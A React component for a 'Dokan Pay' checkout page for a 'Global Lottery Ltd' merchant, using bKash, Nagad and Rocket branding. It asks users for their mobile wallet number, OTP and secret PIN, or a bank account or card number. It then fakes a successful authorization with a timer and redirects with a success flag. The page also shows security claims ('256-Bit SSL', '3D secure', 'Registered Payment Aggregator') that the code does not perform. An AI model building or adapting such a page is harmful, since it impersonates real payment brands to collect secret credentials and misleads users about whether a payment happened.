import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { Shield, CreditCard, Smartphone, CheckCircle, XCircle, ArrowRight, Loader2 } from 'lucide-react';

export function DokanCheckout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();

  const amount = searchParams.get('amount') || '0';
  const orderId = searchParams.get('order_id') || 'N/A';
  const customerName = searchParams.get('customerName') || 'Valued Customer';
  const customerPhone = searchParams.get('customerPhone') || '';

  const [method, setMethod] = useState<'bkash' | 'nagad' | 'rocket' | 'bank'>('bkash');
  const [step, setStep] = useState<'selection' | 'details' | 'processing' | 'success'>('selection');
  
  // Form inputs
  const [walletNumber, setWalletNumber] = useState(customerPhone || '');
  const [pin, setPin] = useState('');
  const [otp, setOtp] = useState('');
  const [bankName, setBankName] = useState('Brac Bank');
  const [accountNumber, setAccountNumber] = useState('');

  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Automatically set default wallet number if phone exists
    if (customerPhone && !walletNumber) {
      setWalletNumber(customerPhone);
    }
  }, [customerPhone]);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'selection') {
      setStep('details');
    } else if (step === 'details') {
      if (!walletNumber && method !== 'bank') {
        alert('Please enter your MFS Wallet Number');
        return;
      }
      setStep('processing');
    }
  };

  useEffect(() => {
    if (step === 'processing') {
      const timer = setTimeout(() => {
        setStep('success');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const handleFinishPayment = () => {
    // Redirect to dashboard with success query parameters
    window.location.href = `/dashboard?payment=success&amount=${amount}&order_id=${orderId}`;
  };

  const handleCancelPayment = () => {
    window.location.href = `/dashboard?payment=cancel`;
  };

  // Color theme selectors based on payment method
  const getThemeColor = () => {
    switch (method) {
      case 'bkash': return 'bg-[#E2125A] text-white hover:bg-[#c00f4c]';
      case 'nagad': return 'bg-[#F26422] text-white hover:bg-[#d54e12]';
      case 'rocket': return 'bg-[#8C3494] text-white hover:bg-[#722778]';
      case 'bank': return 'bg-[#1C2C80] text-white hover:bg-[#121c56]';
    }
  };

  const getThemeText = () => {
    switch (method) {
      case 'bkash': return 'text-[#E2125A]';
      case 'nagad': return 'text-[#F26422]';
      case 'rocket': return 'text-[#8C3494]';
      case 'bank': return 'text-[#1C2C80]';
    }
  };

  const getThemeBorder = (current: typeof method) => {
    if (method !== current) return 'border-gray-200 hover:border-gray-300';
    switch (current) {
      case 'bkash': return 'border-[#E2125A] ring-2 ring-[#E2125A]/20';
      case 'nagad': return 'border-[#F26422] ring-2 ring-[#F26422]/20';
      case 'rocket': return 'border-[#8C3494] ring-2 ring-[#8C3494]/20';
      case 'bank': return 'border-[#1C2C80] ring-2 ring-[#1C2C80]/20';
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-between" id="dokan-checkout-root">
      {/* Header */}
      <header className="bg-white border-b border-gray-100 py-4 px-6 shadow-xs flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <div className="bg-red-600 text-white font-extrabold px-3 py-1.5 rounded-lg text-lg tracking-wider">
            DOKAN PAY
          </div>
          <span className="text-gray-400">|</span>
          <span className="text-gray-500 text-sm font-medium">Secure Payment Gateway</span>
        </div>
        <div className="flex items-center space-x-1.5 text-xs text-emerald-600 bg-emerald-50 px-2.5 py-1 rounded-full font-semibold">
          <Shield className="w-3.5 h-3.5" />
          <span>Secured with 256-Bit SSL</span>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-md w-full mx-auto px-4 py-8 flex-grow flex flex-col justify-center">
        <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          {/* Order Summary Ribbon */}
          <div className="bg-slate-900 text-white px-6 py-4 flex items-center justify-between">
            <div>
              <p className="text-xs text-slate-400">Merchant: Global Lottery Ltd</p>
              <p className="text-xs text-slate-400">Order ID: {orderId}</p>
            </div>
            <div className="text-right">
              <p className="text-xs text-slate-400">Amount to Pay</p>
              <p className="text-xl font-black text-amber-400">${parseFloat(amount).toFixed(2)}</p>
            </div>
          </div>

          {step === 'selection' && (
            <div className="p-6">
              <h3 className="text-lg font-bold text-gray-800 mb-4">Select Payment Method</h3>
              <div className="grid grid-cols-2 gap-3 mb-6">
                {/* bKash Button */}
                <button
                  type="button"
                  onClick={() => setMethod('bkash')}
                  className={`p-4 rounded-xl border-2 flex flex-col items-center justify-center transition-all duration-200 cursor-pointer ${getThemeBorder('bkash')}`}
                >
                  <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Bkash_logo.png" className="h-8 object-contain mb-2" alt="bKash" />
                  <span className="font-extrabold text-[#E2125A]">bKash</span>
                  <span className="text-[10px] text-gray-400 mt-1">Instant Auto-Payment</span>
                </button>

                {/* Nagad Button */}
                <button
                  type="button"
                  onClick={() => setMethod('nagad')}
                  className={`p-4 rounded-xl border-2 flex flex-col items-center justify-center transition-all duration-200 cursor-pointer ${getThemeBorder('nagad')}`}
                >
                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Nagad_Logo.svg" className="h-8 object-contain mb-2" alt="Nagad" />
                  <span className="font-extrabold text-[#F26422]">Nagad</span>
                  <span className="text-[10px] text-gray-400 mt-1">Instant Auto-Payment</span>
                </button>

                {/* Rocket Button */}
                <button
                  type="button"
                  onClick={() => setMethod('rocket')}
                  className={`p-4 rounded-xl border-2 flex flex-col items-center justify-center transition-all duration-200 cursor-pointer ${getThemeBorder('rocket')}`}
                >
                  <div className="w-10 h-10 bg-[#8C3494]/10 rounded-full flex items-center justify-center text-lg mb-1">
                    🚀
                  </div>
                  <span className="font-extrabold text-[#8C3494]">Rocket</span>
                  <span className="text-[10px] text-gray-400 mt-1">Instant Auto-Payment</span>
                </button>

                {/* Bank Transfer Button */}
                <button
                  type="button"
                  onClick={() => setMethod('bank')}
                  className={`p-4 rounded-xl border-2 flex flex-col items-center justify-center transition-all duration-200 cursor-pointer ${getThemeBorder('bank')}`}
                >
                  <CreditCard className="w-8 h-8 text-[#1C2C80] mb-2" />
                  <span className="font-extrabold text-[#1C2C80]">Bank Transfer</span>
                  <span className="text-[10px] text-gray-400 mt-1">Secure IBFT Portal</span>
                </button>
              </div>

              <div className="space-y-3">
                <button
                  onClick={() => setStep('details')}
                  className={`w-full py-3.5 rounded-xl font-bold flex items-center justify-center space-x-2 transition-all ${getThemeColor()}`}
                >
                  <span>Continue with {method.toUpperCase()}</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
                <button
                  onClick={handleCancelPayment}
                  className="w-full text-center text-sm font-semibold text-gray-500 hover:text-gray-700 py-2"
                >
                  Cancel and Return to Merchant
                </button>
              </div>
            </div>
          )}

          {step === 'details' && (
            <form onSubmit={handleNextStep} className="p-6">
              <div className="flex items-center space-x-3 mb-6">
                {method === 'bank' ? (
                  <CreditCard className={`w-8 h-8 ${getThemeText()}`} />
                ) : (
                  <Smartphone className={`w-8 h-8 ${getThemeText()}`} />
                )}
                <div>
                  <h4 className="font-bold text-gray-800 text-lg uppercase">{method} checkout</h4>
                  <p className="text-xs text-gray-400">Verification OTP & security PIN required</p>
                </div>
              </div>

              {method !== 'bank' ? (
                <div className="space-y-4 mb-6">
                  <div>
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
                      {method.toUpperCase()} wallet number (11-Digit)
                    </label>
                    <input
                      type="tel"
                      required
                      placeholder="e.g. 017XXXXXXXX"
                      pattern="01[3-9][0-9]{8}"
                      value={walletNumber}
                      onChange={(e) => setWalletNumber(e.target.value)}
                      className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-red-500/20 focus:border-red-500 font-medium"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
                        Verification Code (OTP)
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="6-digit OTP"
                        maxLength={6}
                        value={otp}
                        onChange={(e) => setOtp(e.target.value)}
                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-red-500/20 focus:border-red-500 text-center font-mono font-bold tracking-widest"
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
                        {method.toUpperCase()} PIN
                      </label>
                      <input
                        type="password"
                        required
                        placeholder="Wallet PIN"
                        maxLength={5}
                        value={pin}
                        onChange={(e) => setPin(e.target.value)}
                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-red-500/20 focus:border-red-500 text-center font-mono font-bold tracking-widest"
                      />
                    </div>
                  </div>
                  <p className="text-[11px] text-gray-400 leading-relaxed text-center">
                    By clicking Confirm, you authorize Dokan Pay to process ${amount} from your MFS account. This is a fully automated 3D secure payment.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 mb-6">
                  <div>
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
                      Select Bank
                    </label>
                    <select
                      value={bankName}
                      onChange={(e) => setBankName(e.target.value)}
                      className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 font-medium"
                    >
                      <option>Brac Bank</option>
                      <option>City Bank</option>
                      <option>Dutch-Bangla Bank</option>
                      <option>Islami Bank Bangladesh</option>
                      <option>Eastern Bank</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">
                      Bank Account/Card Number
                    </label>
                    <input
                      type="text"
                      required
                      placeholder="Enter Account/Card Number"
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 font-medium"
                    />
                  </div>
                </div>
              )}

              <div className="space-y-3">
                <button
                  type="submit"
                  className={`w-full py-3.5 rounded-xl font-black flex items-center justify-center space-x-2 transition-all shadow-md ${getThemeColor()}`}
                >
                  <span>CONFIRM & PAY ${parseFloat(amount).toFixed(2)}</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
                <div className="flex space-x-3">
                  <button
                    type="button"
                    onClick={() => setStep('selection')}
                    className="flex-1 py-2.5 rounded-xl border border-gray-200 font-bold text-gray-600 hover:bg-gray-50 transition-colors text-sm text-center"
                  >
                    Back
                  </button>
                  <button
                    type="button"
                    onClick={handleCancelPayment}
                    className="flex-1 py-2.5 rounded-xl border border-red-100 bg-red-50 font-bold text-red-600 hover:bg-red-100 transition-colors text-sm text-center"
                  >
                    Cancel
                  </button>
                </div>
              </div>
            </form>
          )}

          {step === 'processing' && (
            <div className="p-8 text-center flex flex-col items-center justify-center">
              <Loader2 className={`w-16 h-16 animate-spin mb-4 ${getThemeText()}`} />
              <h3 className="text-xl font-bold text-gray-800 mb-2">Processing Transaction</h3>
              <p className="text-sm text-gray-500 max-w-xs">
                Communicating with {method.toUpperCase()} security servers to authorize the automatic deposit...
              </p>
            </div>
          )}

          {step === 'success' && (
            <div className="p-8 text-center flex flex-col items-center justify-center">
              <CheckCircle className="w-16 h-16 text-emerald-500 mb-4" />
              <h3 className="text-2xl font-black text-gray-800 mb-2">Payment Authorized!</h3>
              <p className="text-sm text-gray-500 mb-6 max-w-xs">
                Your payment of <strong className="text-emerald-600 font-bold">${amount}</strong> has been successfully authorized and confirmed by Dokan Pay.
              </p>
              <button
                onClick={handleFinishPayment}
                className="w-full bg-emerald-600 text-white font-black py-4 rounded-xl shadow-md hover:bg-emerald-700 transition-all flex items-center justify-center space-x-2 text-lg"
              >
                <span>RETURN TO MERCHANTS APP</span>
                <ArrowRight className="w-5 h-5" />
              </button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-100 py-6 px-4 text-center text-xs text-gray-400">
        <p className="mb-2">This is a secured automated payment checkout. Your session is protected by 256-Bit SSL encryption.</p>
        <p>© 2026 Dokan Pay Ltd. All rights reserved. Registered Payment Aggregator.</p>
      </footer>
    </div>
  );
}
